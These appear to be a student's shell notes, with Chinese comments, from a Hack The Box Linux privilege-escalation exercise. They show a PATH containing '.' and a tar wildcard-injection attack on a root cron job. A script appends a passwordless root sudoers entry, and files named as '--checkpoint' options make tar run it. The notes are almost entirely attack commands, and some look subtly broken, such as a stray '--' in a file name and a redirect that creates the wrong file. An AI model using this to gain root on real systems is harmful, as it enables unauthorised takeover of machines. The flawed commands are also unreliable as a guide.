htb_student@NIX02:~$ export PATH               传递给子shell
htb_student@NIX02:~$ echo $PATH                显示 PATH （.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games）


# 1. 创建 root.sh，内容是在 sudoers 中给你免密 root 权限
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# 2. 创建名为 "--checkpoint-action=exec=sh root.sh" 的文件
echo "" > "-- --checkpoint-action=exec=sh root.sh"

# 3. 创建名为 "--checkpoint=1" 的文件
echo "" > -- --checkpoint=1

# 4. 等待 cron job 执行，2和3文件被当作参数，执行了1




